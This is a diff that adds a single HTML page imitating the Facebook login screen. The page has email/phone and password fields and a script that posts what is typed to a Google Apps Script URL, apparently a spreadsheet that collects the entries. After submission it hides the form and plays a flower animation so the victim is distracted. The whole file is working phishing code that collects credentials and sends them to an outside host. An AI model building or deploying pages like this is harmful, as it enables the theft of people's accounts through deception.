@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <title> http/www.facebook.com</title>
+</head>
+<body>
+   
+    <div class="animated" id="animataion">
+        <div class="flower">
+            <div class="f-wrapper">
+                <div class="flower__line"></div>
+                <div class="f">
+                    <div class="flower__leaf flower__leaf--1"></div>
+                    <div class="flower__leaf flower__leaf--2"></div>
+                    <div class="flower__leaf flower__leaf--3"></div>
+                    <div class="flower__leaf flower__leaf--4"></div>
+                    <div class="flower__leaf flower__leaf--5"></div>
+                    <div class="flower__leaf flower__leaf--6"></div>
+                    <div class="flower__leaf flower__leaf--7"></div>
+                    <div class="flower__leaf flower__leaf--8 flower__fall-down--yellow"></div>
+                </div>
+            </div>
+    
+            <div class="f-wrapper f-wrapper--2">
+                <div class="flower__line"></div>
+                <div class="f">
+                    <div class="flower__leaf flower__leaf--1"></div>
+                    <div class="flower__leaf flower__leaf--2"></div>
+                    <div class="flower__leaf flower__leaf--3"></div>
+                    <div class="flower__leaf flower__leaf--4"></div>
+                    <div class="flower__leaf flower__leaf--5"></div>
+                    <div class="flower__leaf flower__leaf--6"></div>
+                    <div class="flower__leaf flower__leaf--7"></div>
+                    <div class="flower__leaf flower__leaf--8 flower__fall-down--pink"></div>
+                </div>
+            </div>
+    
+            <div class="f-wrapper f-wrapper--3">
+                <div class="flower__line"></div>
+                <div class="f">
+                    <div class="flower__leaf flower__leaf--1"></div>
+                    <div class="flower__leaf flower__leaf--2"></div>
+                    <div class="flower__leaf flower__leaf--3"></div>
+                    <div class="flower__leaf flower__leaf--4"></div>
+                    <div class="flower__leaf flower__leaf--5"></div>
+                    <div class="flower__leaf flower__leaf--6"></div>
+                    <div class="flower__leaf flower__leaf--7"></div>
+                    <div class="flower__leaf flower__leaf--8 flower__fall-down--purple"></div>
+                </div>
+            </div>
+            <div class="flower__glass"></div>
+        </div>
+    
+    </div>
+    
+    <form name="submit-to-google-sheet" class="shadow p-3 mb-5 bg-body-tertiary rounded" id="form">
+        <h1><span>facebook</span></h1>
+        <br>
+       <input class="form-control" type="text" name="text" id="" placeholder="Email or Phone Number">
+       <br>
+       <input class="form-control" type="password" name="Password" id="" placeholder="Password">
+       
+       <br>
+       <button type="submit" class="btns" id="btn">Log In</button>
+       <br>
+       <small>Forgoten password?</small>
+        <br>
+       <br>
+       <button class="btn-new">Create New Account</button>
+    </form>
+    <center><small class="page" id="foot"><b>Create a Page </b>for a celebrity band or bussines</small></center>
+
+
+<script>
+  
+// <input class="form-control" type="password" name="Password" id="" placeholder="Password">
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyxibF_Qy6D-983lIBIQwzfXzgiLys4huXkptR_awaHaxisziCig-gXb7M-TpdF4w/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+
+    document.getElementById('form').style.display='none'
+    document.getElementById('foot').style.display='none'
+    document.getElementById('animataion').style.display='block'
+    document.body.style.backgroundColor='black'
+   
+  })
+
+
+
+ 
+</script>
+
+
+</body>
+</html>
